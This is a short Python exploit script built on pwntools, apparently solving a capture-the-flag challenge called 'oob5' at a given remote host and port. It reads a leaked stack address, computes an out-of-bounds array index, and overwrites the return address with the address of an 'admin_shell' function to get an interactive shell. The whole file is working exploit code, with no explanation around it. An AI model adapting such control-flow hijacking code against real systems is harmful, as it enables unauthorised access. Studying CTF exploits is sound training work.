#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './oob5'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3115

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

admin_shell = 0x4007b6

r.recvuntil('Stack Ref = ')
ret_addr = int(r.recvline()[:-1], 16) + 0x28
log.info(f"ret_addr: {hex(ret_addr)}")

user = 0x601040
offset = (ret_addr - 0x40 - user) // 8
log.info(f"offset: {hex(offset)}")
r.sendline(str(offset))
input()
r.send(p64(admin_shell))
r.interactive()
